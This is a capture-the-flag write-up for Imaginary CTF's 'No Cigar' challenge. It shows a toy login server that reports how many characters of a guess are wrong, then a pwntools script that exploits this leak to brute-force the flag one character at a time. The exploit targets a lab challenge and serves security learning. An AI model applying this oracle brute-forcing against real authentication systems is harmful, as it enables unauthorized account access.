<h3> Imaginary CTF </h3>

#### MISC

#### No Cigar
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7a735661-bd09-4e7c-bd72-243e04861359)

We are given the server source code

```python
#!/usr/bin/env python3

def main():
    flag = open("flag.txt").read()
    while True:
        pwd = input("Enter your password: ").ljust(len(flag))
        if pwd == "exit":
            exit()
        count = sum(pwd[i] != c for i, c in enumerate(flag))
        if count == 0:
            print("Logged in successfully!")
            exit()
        else:
            print(f"Close! You're just {count} character{'s' if count else ''} off of your password.")


if __name__ == '__main__':
    main()
```

Basically what that does is:
- When we connect and give a password it gives us a way to let us know if we are using the right character
- And the password is the flag

Let me show what I mean

I hosted that running on port 1234
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/40c299b9-c90b-42c7-99f1-2ef2d19d5269)
```r
socat tcp-l:1234,reuseaddr,fork EXEC:"python3 server.py"
````

Now I can connect to it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7a75ee10-6500-4dbf-b2e6-d5b95db55b6d)

In my current directory I created a test flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0f29e0b6-f46c-4a9c-bb2c-aadd0c6a5117)

If we use the right characters the initial number is set to which happens to be the length of the flag reduces
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/df587f27-6775-4510-aa08-8da4269bdc48)

So we have a way of brute forcing the password

I wrote a script to do that for me

```python
from pwn import *
import string
import warnings

warnings.filterwarnings("ignore")
context.log_level = 'debug'

io = remote('localhost', '1234')

flag = ''
charset = string.printable

for i in range(31, 0, -1):
    found = False
    for c in charset:
        io.sendline(flag + c)
        response = io.recvline()
        expected_response = "Close! You're just {} characters".format(i)
        if expected_response.encode() not in response:
            flag += c
            found = True
            break
    if not found:
        print("Flag character not found, check if assumptions are correct.")
        break

log.info(f'Flag: {flag}')
```

Running it worked
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b3034d3-2577-408c-8ddf-1d12b1e09201)

Cool I also ran it remotely and got the flag

